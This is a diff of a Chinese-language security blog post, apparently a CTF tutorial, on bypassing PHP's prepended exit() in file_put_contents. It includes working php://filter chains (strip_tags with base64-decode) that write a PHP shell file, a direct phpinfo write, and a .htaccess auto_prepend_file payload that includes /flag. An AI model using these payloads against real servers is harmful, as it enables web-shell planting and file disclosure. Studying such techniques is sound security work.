+<h5 id="三"><a href="#三" class="headerlink" title="三"></a>三</h5><p>strip_tags方法&amp;&amp;base64的组合，不过之前构造的这种方法有局限性，要求服务器是linux系统</p>
+<p>因为前面strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把他们二者组合起来👇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php;</span><br></pre></td></tr></table></figure>
+
+<p>为什么说这种构造Windows不行呢，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符。</p>
+<p>如果觉得文件名太难看了，那么可以利用<code>../</code>来构造👇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php</span><br></pre></td></tr></table></figure>
+
+<p>把<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>作为目录名（不管存不存在），再用<code>../</code>回退一下，这样创建出来的文件名为Cyc1e.php，这样创建出来的文件名就正常了</p>
+<p><img src="/../picture/image-20250425084909300.png" alt="image-20250425084909300"></p>
+<h3 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a>第三种情况</h3><p><img src="/../picture/image-20250424215832997.png" alt="image-20250424215832997"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=shell.php</span><br><span class="line">content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但如果过滤了php及起始结束符号的话，就要考虑写.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=.htaccess</span><br><span class="line">content=php_value auto_prepend_file /flag%0a%23\</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -520,7 +632,7 @@ string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再�
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -675,7 +787,7 @@ string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再�
           description: "",
           stripContent: "php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($content,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($filename,$content . &amp;quot;\nxxxxxx&amp;quot",
           date: "Mon Apr 14 2025 10:56:00 GMT+0800",
-          updated: "Mon Apr 14 2025 23:51:00 GMT+0800",
+          updated: "Fri Apr 25 2025 13:35:55 GMT+0800",
           cover: "/../covers/10.jpg",
         };
       </script>
